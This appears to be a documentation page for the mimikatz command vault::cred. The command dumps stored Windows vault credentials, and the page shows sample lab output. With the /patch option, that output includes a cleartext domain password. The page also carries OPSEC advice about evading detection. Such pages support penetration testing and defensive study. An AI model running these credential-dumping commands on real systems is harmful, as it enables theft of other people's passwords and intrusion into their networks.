# cred

vault::cred enumerates vault credentials. More information can be found at Benjamin's guide [howto-\~-scheduled-tasks-credentials](https://github.com/gentilkiwi/mimikatz/wiki/howto-\~-scheduled-tasks-credentials). It has the following command line argument:

* `/patch`: [according to Benjamin](https://twitter.com/gentilkiwi/status/1241786155458277378) this option must be avoided as it is not OPSEC safe and DPAPI is a better solution

```
mimikatz # vault::cred
TargetName : TERMSRV/192.168.0.224 / <NULL>
UserName   : hacklab\m3g9tr0n
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 2 - local_machine
Flags      : 00000000
Credential :
Attributes : 0

TargetName : Domain:target=TERMSRV/192.168.0.224 / <NULL>
UserName   : hacklab\m3g9tr0n
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 2 - local_machine
Flags      : 00000000
Credential :
Attributes : 0

TargetName : WindowsLive:target=virtualapp/didlogical / <NULL>
UserName   : 02ihgxxcusaapvlp
Comment    : PersistedCredential
Type       : 1 - generic
Persist    : 2 - local_machine
Flags      : 00000000
Credential :
Attributes : 32
```

```
mimikatz # vault::cred /patch
TargetName : TERMSRV/192.168.0.224 / <NULL>
UserName   : hacklab\m3g9tr0n
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 2 - local_machine
Flags      : 00000000
Credential : Suoer_SecretPass1!
Attributes : 0

TargetName : Domain:target=TERMSRV/192.168.0.224 / <NULL>
UserName   : hacklab\m3g9tr0n
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 2 - local_machine
Flags      : 00000000
Credential : Suoer_SecretPass1!
Attributes : 0

TargetName : WindowsLive:target=virtualapp/didlogical / <NULL>
UserName   : 02ihgxxcusaapvlp
Comment    : PersistedCredential
Type       : 1 - generic
Persist    : 2 - local_machine
Flags      : 00000000
Credential :
Attributes : 32
```
